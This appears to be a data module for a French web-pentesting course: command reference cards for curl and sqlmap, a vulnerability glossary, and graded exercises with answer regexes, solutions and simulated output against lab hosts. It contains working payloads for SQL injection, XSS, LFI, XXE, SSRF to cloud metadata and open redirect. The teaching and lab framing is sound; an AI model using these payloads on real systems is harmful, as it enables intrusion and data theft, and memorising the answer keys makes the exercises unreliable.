export default {
  blocks: [
    { t: 'h', x: "4.13 Fiches commandes : prouver une vulnérabilité sans la surexploiter" },
    {
      t: 'p',
      x: "En laboratoire, la preuve doit être <strong>minimale, reproductible et non destructive</strong>. Une seule ligne de données suffit à démontrer un IDOR ; un délai conditionnel suffit à prouver une SQLi aveugle. Les commandes ci-dessous montrent comment construire cette preuve avec <code>curl</code> et <code>sqlmap</code>, puis comment interpréter la réponse."
    },
    {
      t: 'cmdref',
      items: [
        {
          cmd: 'curl -s URL', tag: 'Requête GET',
          what: "Envoie une requête GET et affiche le corps de la réponse. <code>-s</code> masque la barre de progression.",
          gives: "Le HTML ou JSON renvoyé, les messages d'erreur, les données reflétées et parfois des traces.",
          use: "Tester un paramètre un par un. Toujours encoder les caractères spéciaux et utiliser des guillemets simples autour de l'URL pour protéger <code>&amp;</code>.",
          syntax: "curl -s 'URL?param=valeur'",
          example: "curl -s 'http://dvwa.lab/vulnerabilities/sqli/?id=1&Submit=Submit'",
          read: "Comparez la réponse à une requête normale. Un message SQL, une ligne supplémentaire ou une disparition de contenu est un signal. Ne concluez pas sur une seule réponse : testez un vrai et un faux.<br><br><b>Exemple :</b> <code>id=1' AND 1=1-- -</code> renvoie le profil ; <code>id=1' AND 1=2-- -</code> renvoie vide → injection booléenne confirmée."
        },
        {
          cmd: 'curl -s -o /dev/null -w', tag: 'Mesure',
          what: "Envoie une requête sans afficher le corps et écrit des métriques (code, taille, temps).",
          gives: "Le code HTTP, la taille de la réponse et le temps total. Utile pour comparer deux requêtes objectivement.",
          use: "Pour les tests booléens et temporels, mesurez au lieu de « regarder » la page. <code>%{http_code} %{size_download} %{time_total}</code>.",
          syntax: "curl -s -o /dev/null -w '%{http_code} %{size_download} %{time_total}\\n' URL",
          example: "curl -s -o /dev/null -w '%{http_code} %{size_download} %{time_total}\\n' 'http://dvwa.lab/vulnerabilities/sqli/?id=1%27%20AND%20SLEEP(5)--%20-'",
          read: "Un temps de 5 secondes de plus qu'une requête normale indique un <code>SLEEP(5)</code> exécuté. Une différence de taille stable entre vrai et faux confirme une injection booléenne.",
          pivot: "Répétez chaque mesure 3 fois pour éviter un faux positif lié à la latence réseau. Documentez les temps ou tailles dans la preuve."
        },
        {
          cmd: 'sqlmap', tag: 'SQLi · validation',
          what: "Automatise la détection et l'exploitation des injections SQL : types, bases, tables, colonnes, données.",
          gives: "Le type d'injection, le SGBD, les bases accessibles, les tables, les colonnes et parfois des fichiers/commandes si les privilèges le permettent.",
          use: "En lab ou sur cible autorisée uniquement. Commencer par <code>--batch --dbs</code> pour lister les bases, puis <code>-D base -T table --dump</code> avec un volume limité. Toujours préciser le cookie de session.",
          syntax: 'sqlmap -u "URL?param=1" --cookie="..." --batch --dbs',
          example: 'sqlmap -u "http://dvwa.lab/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=...; security=low" --batch --dbs',
          read: "Les bases listées confirment l'injection. Ne dumps jamais toute une base : extrayez une ligne ou un schéma pour prouver l'impact. <code>information_schema</code> est une base système normale.<br><br><b>Exemple :</b> <code>available databases [2]: dvwa, information_schema</code> → la base applicative est accessible ; testez uniquement une table de test."
        },
        {
          cmd: 'curl -X POST -d', tag: 'Requête POST',
          what: "Envoie une requête POST avec un corps de formulaire ou JSON.",
          gives: "La réponse du serveur au corps envoyé : validation, erreur, redirection ou données créées.",
          use: "Tester les formulaires, les API JSON et les injections dans le corps. <code>-H 'Content-Type: application/json'</code> pour le JSON.",
          syntax: "curl -s -X POST -d 'param=valeur' URL",
          example: "curl -s -X POST -d 'username=alice&password=test' http://dvwa.lab/login.php",
          read: "Un message d'erreur détaillé, un code 500 ou une différence de comportement révèle le traitement. Pour une SQLi, injectez dans chaque champ et comparez.",
          pivot: "Conservez la requête exacte (méthode, en-têtes, corps) dans la fiche de vulnérabilité pour la reproduction."
        },
        {
          cmd: 'curl -H / -b', tag: 'En-têtes & cookies',
          what: "Ajoute des en-têtes personnalisés (<code>-H</code>) ou envoie des cookies (<code>-b</code>).",
          gives: "La réponse obtenue avec un contexte d'authentification ou un en-tête modifié.",
          use: "Tester les contrôles d'accès avec deux sessions, les en-têtes de contournement (<code>X-Forwarded-For</code>, <code>X-Original-URL</code>) et les tokens.",
          syntax: "curl -s -H 'Authorization: Bearer TOKEN' -b 'session=...' URL",
          example: "curl -s -H 'Authorization: Bearer TOKEN_ALICE' https://app.acme.example/api/invoices/1043",
          read: "Si le token d'Alice renvoie la facture de Bob, l'autorisation est défaillante. Si un en-tête de contournement donne accès à une page 403, le contrôle est côté client ou basé sur un en-tête non fiable.",
          pivot: "Documentez la paire requête/réponse avec deux identités distinctes. C'est la preuve la plus solide d'un IDOR."
        },
        {
          cmd: 'curl -F', tag: 'Upload',
          what: "Envoie un fichier en multipart/form-data.",
          gives: "La réponse à l'upload : succès, chemin, erreur de type, ou contenu du fichier si l'application le sert.",
          use: "Tester les contrôles d'extension, de type MIME et de contenu. Utilisez des fichiers de test inoffensifs (texte, image) et jamais un web shell sur une cible réelle.",
          syntax: 'curl -s -F "file=@fichier.txt" URL',
          example: 'curl -s -F "file=@test.txt;type=text/plain" http://dvwa.lab/vulnerabilities/upload/',
          read: "Un upload accepté puis servi depuis le webroot est critique. Vérifiez le nom généré, le Content-Type renvoyé et si le fichier est accessible par URL.",
          pivot: "Si un fichier HTML est accepté et servi, testez un XSS stocké avec un contenu inoffensif. Si un script est accepté, c'est un RCE potentiel à documenter sans l'exécuter hors lab."
        },
        {
          cmd: 'base64 -d', tag: 'Décodage',
          what: "Décode une chaîne Base64 (ou Base64URL après remplacement des caractères).",
          gives: "Le contenu lisible d'un token, d'un cookie ou d'un paramètre encodé.",
          use: "Analyser un JWT ou un cookie pour comprendre les claims. Ne confondez pas décodage et déchiffrement : Base64 n'est pas une protection.",
          syntax: "echo 'chaine' | base64 -d",
          example: "echo 'eyJ1aWQiOjEwNDIsInJvbGUiOiJ1c2VyIn0' | base64 -d",
          read: "Un JWT contient un header, un payload et une signature. Lire <code>role: user</code> ne suffit pas : la faille est une signature absente ou vérifiable avec une clé faible.",
          pivot: "Modifiez un claim dans un lab, re-signez si possible, et vérifiez si le serveur applique l'autorisation. Ne testez jamais sur une session réelle sans autorisation."
        },
        {
          cmd: 'grep / diff', tag: 'Comparaison',
          what: "Filtre ou compare des réponses pour isoler une différence.",
          gives: "La ligne, le code ou le champ qui change entre deux requêtes.",
          use: "Enregistrer deux réponses dans des fichiers puis <code>diff -u</code>. Pour les tests booléens, comparer les tailles et les mots.",
          syntax: 'diff -u reponse_vraie.txt reponse_fausse.txt',
          example: "curl -s '...id=1%27%20AND%201=1--%20-' > vrai.txt; curl -s '...id=1%27%20AND%201=2--%20-' > faux.txt; diff -u vrai.txt faux.txt",
          read: "Une différence localisée (nom, email, compteur) indique que la condition influence la requête. Une différence globale peut être due à un template ou à un cache.",
          pivot: "Joignez le diff à la preuve. Il est plus convaincant qu'une capture d'écran seule."
        }
      ]
    },
    { t: 'h', x: "4.14 Glossaire : vulnérabilités, sources et défenses" },
    {
      t: 'glossary',
      items: [
        { term: 'Injection', def: "Fait qu'une donnée non fiable soit interprétée comme du code ou une commande par le composant qui la reçoit.", use: "Identifier le parseur (SQL, HTML, XML, shell) et le contexte exact avant de construire un payload.", ex: "SQL, XSS, XXE, command injection sont des injections." },
        { term: 'SQLi', def: "Injection dans une requête SQL, permettant de modifier la structure de la requête.", use: "Tester quote, booléen, temporel, UNION ; prouver avec une requête minimale et corriger avec des requêtes préparées.", ex: "' OR '1'='1' -- " },
        { term: 'SQLi aveugle', def: "Injection sans données affichées : on déduit l'information par vrai/faux ou par délai.", use: "Comparer les tailles de réponse ou mesurer un SLEEP conditionnel.", ex: "' AND SLEEP(5)-- -" },
        { term: 'XSS', full: 'Cross-Site Scripting', def: "Injection de JavaScript exécuté dans le navigateur d'un autre utilisateur, dans l'origine de l'application.", use: "Identifier le contexte (HTML, attribut, JS, URL) et le sink ; prouver avec un payload inoffensif.", ex: '<img src=x onerror=console.log(1)>' },
        { term: 'XSS réfléchi / stocké / DOM', def: "Réfléchi : immédiat dans la réponse. Stocké : enregistré puis servi. DOM : injecté par le JavaScript client.", use: "Adapter le test et la remédiation : encodage de sortie, sanitisation, CSP, textContent.", ex: 'Stored : commentaire contenant <script>.' },
        { term: 'CSRF', full: 'Cross-Site Request Forgery', def: "Forcer le navigateur d'une victime authentifiée à envoyer une requête légitime à son insu.", use: "Vérifier les tokens anti-CSRF, SameSite et l'origine ; tester les actions sensibles.", ex: '<form action="/transfer" method="POST">' },
        { term: 'SSRF', full: 'Server-Side Request Forgery', def: "Faire émettre une requête par le serveur vers une destination choisie par l'attaquant.", use: "Tester les paramètres URL, les webhooks et les imports ; cibler les métadonnées cloud et les services internes.", ex: 'http://169.254.169.254/latest/meta-data/' },
        { term: 'LFI / RFI', def: "Inclusion de fichier local ou distant par une application qui construit un chemin à partir d'une entrée.", use: "Tester <code>../</code>, les wrappers PHP et les logs ; corriger avec une allowlist.", ex: '?page=../../../../etc/passwd' },
        { term: 'XXE', full: 'XML External Entity', def: "Injection d'entités XML externes pour lire des fichiers ou émettre des requêtes.", use: "Tester les parseurs XML ; désactiver les entités externes et les DTD.", ex: '<!ENTITY xxe SYSTEM "file:///etc/passwd">' },
        { term: 'IDOR', full: 'Insecure Direct Object Reference', def: "Accès à un objet d'autrui en modifiant un identifiant, faute de contrôle d'autorisation côté serveur.", use: "Tester avec deux comptes et changer ID, tenant, rôle ; ne pas se fier à un UUID.", ex: '/api/invoices/1043 avec le token d\'Alice' },
        { term: 'Contrôle d\'accès (BAC)', def: "Ensemble des règles qui déterminent qui peut faire quoi sur quel objet.", use: "Vérifier chaque requête côté serveur, deny by default, moindre privilège.", ex: 'Un utilisateur ne doit lire que ses factures.' },
        { term: 'Authentification / Autorisation', def: "Authentification = vérifier l'identité ; autorisation = vérifier les droits.", use: "Ne pas confondre : un utilisateur authentifié peut ne pas être autorisé.", ex: '401 = non authentifié ; 403 = authentifié mais interdit.' },
        { term: 'Payload', def: "Charge utile envoyée pour déclencher ou prouver un comportement.", use: "Minimale, contextuelle, non destructive. Documenter le contexte exact.", ex: "' OR 1=1-- - ; <svg onload=…>" },
        { term: 'Source / Sink', def: "Source : point d'entrée de données. Sink : fonction qui interprète la donnée (innerHTML, SQL, exec).", use: "Suivre le flux de la source au sink pour trouver les injections et choisir l'encodage.", ex: 'location.hash → innerHTML' },
        { term: 'Requête préparée', def: "Requête dont les paramètres sont transmis séparément du code SQL.", use: "Défense de référence contre la SQLi. Ne remplace pas la validation métier.", ex: '$stmt = $pdo->prepare("… WHERE id = ?");' },
        { term: 'Encodage de sortie', def: "Transformation d'une donnée pour son contexte d'affichage (HTML, attribut, JS, URL, CSS).", use: "Seule défense fiable contre le XSS. Contextuel, pas global.", ex: '&lt; pour < en HTML' },
        { term: 'CSP', full: 'Content Security Policy', def: "En-tête qui restreint les sources de scripts, styles, images et frames.", use: "Réduire l'impact d'un XSS avec nonces/hashes ; ne remplace pas l'encodage.", ex: "script-src 'self' 'nonce-…'" },
        { term: 'WAF', full: 'Web Application Firewall', def: "Filtre HTTP qui bloque des signatures ou des anomalies.", use: "Mitigation temporaire, jamais une correction. Peut être contourné par encodage ou logique métier.", ex: "ModSecurity + OWASP CRS" }
      ]
    }
  ],
  exos: [
    {
      id: 'm4-e1',
      title: 'Provoquer une erreur SQL',
      context: "Le paramètre <code>id</code> de DVWA est injectable. Vous devez confirmer l'existence d'une erreur SQL avec une simple quote.",
      task: "Envoyez <code>id=1'</code> au endpoint <code>http://dvwa.lab/vulnerabilities/sqli/</code> et affichez la réponse.",
      hint: "Utilisez <code>curl -s</code> et encodez la quote en <code>%27</code> ou laissez-la entre guillemets simples.",
      accept: [/curl\s+-s\s+.*dvwa\.lab.*id=1(%27|').*/i],
      solution: "curl -s 'http://dvwa.lab/vulnerabilities/sqli/?id=1%27&Submit=Submit'",
      output: [
        'You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near \'\\\' AND Submit=Submit\' at line 1',
        '!!Erreur SQL détaillée : la donnée est concaténée dans la requête.'
      ],
      read: "Le message d'erreur révèle que la quote casse la requête. C'est une confirmation error-based, mais l'erreur seule ne prouve pas encore l'exploitabilité.",
      pivot: "Passez à un test booléen pour confirmer que vous pouvez influencer la condition, puis à sqlmap pour identifier le SGBD, uniquement en lab."
    },
    {
      id: 'm4-e2',
      title: 'Confirmer une injection booléenne',
      context: "L'erreur SQL est confirmée. Vous devez prouver que la condition <code>1=1</code> renvoie un résultat et <code>1=2</code> aucun.",
      task: "Testez <code>id=1' AND 1=2-- -</code> et vérifiez que la réponse ne contient aucun profil.",
      hint: "Encodez l'espace et la quote, ou utilisez des guillemets simples autour de l'URL.",
      accept: [/curl\s+-s\s+.*dvwa\.lab.*1(%27|')\s*AND\s*1=2/i, /curl\s+-s\s+.*dvwa\.lab.*1%27%20AND%201=2/i],
      solution: "curl -s 'http://dvwa.lab/vulnerabilities/sqli/?id=1%27%20AND%201=2--%20-&Submit=Submit'",
      output: [
        '..(page sans résultat)',
        'First name: ',
        'Surname: ',
        '++Aucun profil renvoyé : la condition fausse est bien interprétée par SQL.'
      ],
      read: "La disparition du résultat pour <code>1=2</code>, comparée au résultat pour <code>1=1</code>, confirme une injection booléenne.",
      pivot: "Documentez les deux requêtes et les deux réponses. C'est une preuve reproductible sans extraction de données."
    },
    {
      id: 'm4-e3',
      title: 'Lister les bases avec sqlmap',
      context: "L'injection est confirmée. Vous devez identifier les bases accessibles avec le compte applicatif.",
      task: "Lancez <code>sqlmap</code> sur l'URL DVWA avec le cookie de session, en mode batch, pour lister les bases.",
      hint: "Options : <code>-u</code>, <code>--cookie</code>, <code>--batch</code>, <code>--dbs</code>.",
      accept: [/^sqlmap\s+-u\s+.*dvwa\.lab.*--cookie=.*--batch\s+--dbs/i, /^sqlmap\s+-u\s+.*dvwa\.lab.*--batch.*--dbs/i],
      solution: 'sqlmap -u "http://dvwa.lab/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=abc123; security=low" --batch --dbs',
      output: [
        '..(détection du type d\'injection)',
        'Parameter: id (GET)',
        '    Type: boolean-based blind',
        '    Type: time-based blind',
        'back-end DBMS: MySQL >= 5.0 (MariaDB fork)',
        'available databases [2]:',
        '[*] dvwa',
        '[*] information_schema',
        '++2 bases accessibles'
      ],
      read: "Le compte applicatif peut lire deux bases. <code>information_schema</code> est système ; <code>dvwa</code> contient les données applicatives.",
      pivot: "N'extrayez pas toute la base. Listez les tables de <code>dvwa</code> et dumpez une seule ligne de test pour prouver l'impact, avec accord."
    },
    {
      id: 'm4-e4',
      title: 'Tester un XSS réfléchi',
      context: "Le paramètre <code>name</code> est renvoyé dans la page. Vous devez vérifier s'il est encodé.",
      task: "Envoyez <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> dans le paramètre <code>name</code> et affichez la réponse.",
      hint: "Utilisez <code>curl -s</code> avec l'URL encodée ou entre guillemets simples.",
      accept: [/curl\s+-s\s+.*[?&]name=.*(script|%3Cscript)/i],
      solution: "curl -s 'http://dvwa.lab/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(1)%3C%2Fscript%3E'",
      output: [
        '<div class="vulnerable">Hello <script>alert(1)</script></div>',
        '!!Le script est renvoyé sans encodage : XSS réfléchi confirmé.'
      ],
      read: "Le payload apparaît tel quel dans le HTML. Le navigateur l'exécuterait. Le contexte est ici du HTML de corps.",
      pivot: "Remplacez alert(1) par une preuve inoffensive (console.log) et documentez le contexte. La remédiation est l'encodage HTML de sortie."
    },
    {
      id: 'm4-e5',
      title: 'Vérifier un cookie de session',
      context: "Avant de conclure sur l'impact d'un XSS, vous devez savoir si le cookie de session est protégé.",
      task: "Affichez les en-têtes de <code>http://dvwa.lab/</code> et recherchez le cookie de session.",
      hint: "Utilisez <code>curl -sSI</code>.",
      accept: [/^curl\s+-sSI\s+http:\/\/dvwa\.lab\/?$/i],
      solution: 'curl -sSI http://dvwa.lab/',
      output: [
        'HTTP/1.1 200 OK',
        'Server: nginx',
        'Set-Cookie: PHPSESSID=abc123; path=/',
        'X-Powered-By: PHP/7.4.33',
        '++Cookie sans HttpOnly, sans Secure, sans SameSite'
      ],
      read: "Un cookie sans HttpOnly est lisible par JavaScript. Un XSS pourrait donc lire la session. Sans Secure, il peut aussi fuiter en HTTP.",
      pivot: "Reliez le XSS au cookie pour évaluer l'impact réel : vol de session. Proposez HttpOnly, Secure et SameSite en remédiation."
    },
    {
      id: 'm4-e6',
      title: 'Tester un IDOR avec deux jetons',
      context: "Alice a la facture 1042. Bob a la 1043. Vous devez vérifier si le token d'Alice permet de lire la facture de Bob.",
      task: "Envoyez une requête GET sur <code>https://app.acme.example/api/invoices/1043</code> avec le token d'Alice.",
      hint: "Utilisez <code>curl -s -H 'Authorization: Bearer TOKEN_ALICE'</code>.",
      accept: [/curl\s+-s\s+-H\s+["']Authorization:\s*Bearer\s+TOKEN_ALICE["']\s+https:\/\/app\.acme\.example\/api\/invoices\/1043/i],
      solution: "curl -s -H 'Authorization: Bearer TOKEN_ALICE' https://app.acme.example/api/invoices/1043",
      output: [
        '{ "id": 1043, "user": "bob", "amount": 980.00, "status": "paid" }',
        '!!Le token d\'Alice renvoie la facture de Bob : IDOR confirmé.'
      ],
      read: "Le champ <code>user</code> vaut bob alors que le token est celui d'Alice. Le serveur ne vérifie pas la propriété de l'objet.",
      pivot: "Documentez un seul champ non sensible comme preuve. Recommandez un contrôle d'autorisation côté serveur et testez aussi les autres méthodes (PUT, DELETE)."
    },
    {
      id: 'm4-e7',
      title: 'Tester une SSRF vers les métadonnées cloud',
      context: "Un endpoint <code>/api/fetch</code> accepte une URL et récupère son contenu. Vous êtes dans un lab cloud simulé.",
      task: "Envoyez une requête POST JSON avec l'URL <code>http://169.254.169.254/latest/meta-data/</code>.",
      hint: "Utilisez <code>curl -s -X POST -H 'Content-Type: application/json' -d '{\"url\":\"...\"}'</code>.",
      accept: [/curl\s+-s\s+-X\s+POST.*-d\s+.*169\.254\.169\.254.*api\/fetch/i, /curl\s+-s\s+-X\s+POST.*api\/fetch.*169\.254\.169\.254/i],
      solution: "curl -s -X POST -H 'Content-Type: application/json' -d '{\"url\":\"http://169.254.169.254/latest/meta-data/\"}' https://app.acme.example/api/fetch",
      output: [
        'ami-id',
        'hostname',
        'iam/',
        'instance-id',
        'placement/',
        '++Le serveur a atteint le service de métadonnées cloud.'
      ],
      read: "La réponse liste les métadonnées de l'instance. C'est une SSRF confirmée avec accès au service interne.",
      pivot: "Ne récupérez pas de credentials IAM. Prouvez l'accès avec le listing et recommandez IMDSv2, une allowlist et le blocage des IP link-local."
    },
    {
      id: 'm4-e8',
      title: 'Tester une LFI',
      context: "Le paramètre <code>page</code> inclut un fichier. Vous devez vérifier si la traversée de répertoire est possible.",
      task: "Demandez <code>../../../../etc/passwd</code> au endpoint <code>http://dvwa.lab/index.php?page=</code>.",
      hint: "Encodez les points ou utilisez l'URL brute entre guillemets simples.",
      accept: [/curl\s+-s\s+["']http:\/\/dvwa\.lab\/index\.php\?page=.*etc\/passwd/i],
      solution: "curl -s 'http://dvwa.lab/index.php?page=../../../../etc/passwd'",
      output: [
        'root:x:0:0:root:/root:/bin/bash',
        'daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin',
        'www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin',
        '++Lecture de /etc/passwd confirmée'
      ],
      read: "Le fichier système est affiché. La traversée fonctionne et le processus web tourne en www-data.",
      pivot: "Ne lisez pas de fichiers contenant des secrets. Prouvez avec /etc/passwd, puis testez les wrappers PHP pour évaluer l'impact RCE, en lab."
    },
    {
      id: 'm4-e9',
      title: 'Tester une XXE',
      context: "Un endpoint accepte du XML. Vous devez vérifier si les entités externes sont résolues.",
      task: "Envoyez un XML avec une entité <code>xxe</code> pointant vers <code>file:///etc/passwd</code> au endpoint <code>http://dvwa.lab/api/xml</code>.",
      hint: "Utilisez <code>curl -s -X POST -H 'Content-Type: application/xml' --data-binary @-</code> avec un heredoc ou une chaîne.",
      accept: [/curl\s+-s\s+-X\s+POST.*xml.*(file:\/\/\/etc\/passwd|xxe)/i],
      solution: "curl -s -X POST -H 'Content-Type: application/xml' --data-binary '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><stockCheck><productId>&xxe;</productId></stockCheck>' http://dvwa.lab/api/xml",
      output: [
        '<stockCheck><productId>root:x:0:0:root:/root:/bin/bash',
        'daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</productId></stockCheck>',
        '!!Entité externe résolue : XXE confirmée.'
      ],
      read: "Le contenu de /etc/passwd apparaît dans la réponse XML. Le parseur accepte les entités externes.",
      pivot: "Prouvez la lecture d'un fichier non sensible. Recommandez la désactivation des DTD/entités externes et l'usage de parseurs sûrs."
    },
    {
      id: 'm4-e10',
      title: 'Tester une redirection ouverte',
      context: "Le paramètre <code>next</code> redirige après le login.",
      task: "Demandez <code>https://app.acme.example/login?next=https://evil.lab/phish</code> et observez la redirection.",
      hint: "Utilisez <code>curl -sSI</code> et regardez l'en-tête <code>Location</code>.",
      accept: [/^curl\s+-sSI\s+["']?https:\/\/app\.acme\.example\/login\?next=https:\/\/evil\.lab\/phish["']?$/i],
      solution: 'curl -sSI "https://app.acme.example/login?next=https://evil.lab/phish"',
      output: [
        'HTTP/1.1 302 Found',
        'Location: https://evil.lab/phish',
        '++Redirection vers un domaine externe non validé'
      ],
      read: "L'application redirige vers evil.lab sans validation. C'est un open redirect, utilisable pour du phishing avec une URL de confiance.",
      pivot: "Testez des variantes d'encodage et de contournement d'allowlist. Recommandez une allowlist de chemins relatifs ou de domaines."
    },
    {
      id: 'm4-e11',
      title: 'Tester un upload de fichier',
      context: "Le formulaire d'upload accepte des images. Vous devez vérifier si le type réel est contrôlé.",
      task: "Envoyez <code>test.txt</code> en tant que <code>text/plain</code> au endpoint d'upload DVWA.",
      hint: "Utilisez <code>curl -s -F \"file=@test.txt;type=text/plain\"</code>.",
      accept: [/curl\s+-s\s+-F\s+["']?file=@test\.txt.*text\/plain.*upload/i],
      solution: 'curl -s -F "file=@test.txt;type=text/plain" http://dvwa.lab/vulnerabilities/upload/',
      output: [
        '../../hackable/uploads/test.txt succesfully uploaded!',
        '++Fichier texte accepté et stocké dans le webroot'
      ],
      read: "Un fichier texte est accepté dans un dossier servi par le web. Le contrôle ne se limite pas à l'extension : testez aussi les doubles extensions et le contenu.",
      pivot: "Ne téléversez jamais de web shell. Prouvez avec un fichier HTML inoffensif que le contenu est servi, puis recommandez une allowlist, un renommage aléatoire et un stockage hors webroot."
    },
    {
      id: 'm4-e12',
      title: 'Vérifier l\'énumération de comptes',
      context: "Le formulaire de login renvoie des messages différents selon que l'utilisateur existe ou non.",
      task: "Testez <code>alice</code> puis <code>utilisateur_inexistant_xyz</code> sur <code>http://dvwa.lab/login.php</code> et comparez les réponses.",
      hint: "Deux <code>curl -s -X POST -d</code> successifs, puis comparez avec <code>diff</code> ou à l'œil.",
      accept: [/curl\s+-s\s+-X\s+POST\s+-d\s+.*alice.*login\.php.*inexistant/i, /curl\s+-s\s+-X\s+POST.*login\.php.*alice/i],
      solution: "curl -s -X POST -d 'username=alice&password=wrong' http://dvwa.lab/login.php; echo; curl -s -X POST -d 'username=utilisateur_inexistant_xyz&password=wrong' http://dvwa.lab/login.php",
      output: [
        '..Réponse pour alice :',
        'Login failed',
        '..Réponse pour utilisateur inexistant :',
        'Unknown user',
        '!!Messages différents : énumération de comptes possible.'
      ],
      read: "Le message « Unknown user » révèle que le compte n'existe pas. Un attaquant peut ainsi construire une liste de comptes valides.",
      pivot: "Documentez les deux réponses. Recommandez un message générique et un délai constant. Ne lancez pas de brute force sans autorisation."
    },
    {
      id: 'm4-e13',
      title: 'Comparer deux réponses avec diff',
      context: "Vous devez produire une preuve de la différence entre une requête vraie et une requête fausse.",
      task: "Enregistrez les réponses de <code>id=1' AND 1=1-- -</code> et <code>id=1' AND 1=2-- -</code> dans <code>vrai.txt</code> et <code>faux.txt</code>, puis comparez-les.",
      hint: "Deux <code>curl -s ... &gt; fichier</code> puis <code>diff -u vrai.txt faux.txt</code>.",
      accept: [/curl\s+-s\s+.*1=1.*>\s*vrai\.txt.*curl\s+-s\s+.*1=2.*>\s*faux\.txt.*diff/i, /diff\s+-u\s+vrai\.txt\s+faux\.txt/i],
      solution: "curl -s 'http://dvwa.lab/vulnerabilities/sqli/?id=1%27%20AND%201=1--%20-&Submit=Submit' > vrai.txt; curl -s 'http://dvwa.lab/vulnerabilities/sqli/?id=1%27%20AND%201=2--%20-&Submit=Submit' > faux.txt; diff -u vrai.txt faux.txt",
      output: [
        '--- vrai.txt',
        '+++ faux.txt',
        '@@ -1,6 +1,4 @@',
        '-First name: admin',
        '-Surname: admin',
        '+First name: ',
        '+Surname: ',
        '++Différence localisée : condition vraie vs fausse'
      ],
      read: "Le diff montre que les champs First name et Surname disparaissent dans la réponse fausse. La condition influence donc la requête.",
      pivot: "Conservez vrai.txt, faux.txt et le diff dans le dossier de preuve. C'est plus solide qu'une capture d'écran."
    },
    {
      id: 'm4-e14',
      title: 'Décoder un JWT pour lire les claims',
      context: "Un cookie contient un JWT. Vous devez lire le payload pour comprendre les rôles.",
      task: "Décodez la partie payload <code>eyJ1aWQiOjEwNDIsInJvbGUiOiJ1c2VyIn0</code> en Base64.",
      hint: "Utilisez <code>echo ... | base64 -d</code>.",
      accept: [/echo\s+.*eyJ1aWQiOjEwNDIsInJvbGUiOiJ1c2VyIn0.*base64\s+-d/i],
      solution: "echo 'eyJ1aWQiOjEwNDIsInJvbGUiOiJ1c2VyIn0' | base64 -d",
      output: ['{"uid":1042,"role":"user"}'],
      read: "Le token contient l'identifiant 1042 et le rôle user. Ces valeurs sont lisibles mais pas forcément modifiables sans signature valide.",
      pivot: "Vérifiez si la signature est contrôlée : testez une modification de rôle dans un lab, puis regardez si le serveur l'accepte. Ne testez jamais sur une session réelle sans autorisation."
    }
  ]
};
